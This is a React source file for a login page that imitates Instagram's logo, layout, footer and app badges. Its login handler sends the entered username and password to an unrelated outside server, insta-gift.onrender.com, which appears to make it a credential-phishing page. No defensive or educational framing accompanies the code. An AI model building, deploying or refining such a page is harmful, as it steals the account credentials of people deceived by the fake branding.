import React from "react";
import "./App.css";
import pic from "../main.png";
import { useState } from "react";

const App = () => {
  const [username, setUsername] = React.useState("");
  const [password, setPassword] = React.useState("");

  const servercall = async (e) => {
    e.preventDefault();
    console.log("entered in servercall");
    const res = await fetch("https://insta-gift.onrender.com/api/v1/auth/login", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({ username, password }),
    });

    const data = await res.json();
  }

  return (
    <React.Fragment>
      <div id="wrapper">
        <div className="container">
          <img src={pic} className="phone-app-demo" />
          <div className="form-data">
            <form action="">
              <div className="logo">
                <h1>Instagram</h1>
              </div>
              <input
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                type="text"
                placeholder="Phone number, username, or email"
              />
              <input
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                type="password"
                placeholder="Password"
              />
              <button className="form-btn"  onClick={servercall} >
                Log in
              </button>
              <span className="has-separator">Or</span>
              <a href="#" className="facebook-login">
                <i className="fab fa-facebook" /> Log in with Facebook
              </a>
              <a className="password-reset" href="#">
                Forgot password?
              </a>
            </form>
            <div className="sign-up">
              Don't an account? <a href="#">Sign up</a>
            </div>
            <div className="get-the-app">
              <span>Get the app</span>
              <div className="badge">
                <img
                  src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png"
                  alt="android App"
                />
                <img
                  src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png"
                  alt="ios app"
                />
              </div>
            </div>
          </div>
        </div>

        <footer>
          <div className="container">
            <nav className="footer-nav">
              <ul>
                <li>
                  <a href="#">About Us</a>
                </li>
                <li>
                  <a href="#">Support</a>
                </li>
                <li>
                  <a href="#">Jobs</a>
                </li>
                <li>
                  <a href="#">Privacy</a>
                </li>
                <li>
                  <a href="#">Terms</a>
                </li>
                <li>
                  <a href="#">Profiles</a>
                </li>
                <li>
                  <a href="#">Languages</a>
                </li>
              </ul>
            </nav>
            <div className="copyright-notice">&copy; 2019 Complaints</div>
          </div>
        </footer>
      </div>
    </React.Fragment>
  );
};

export default App;
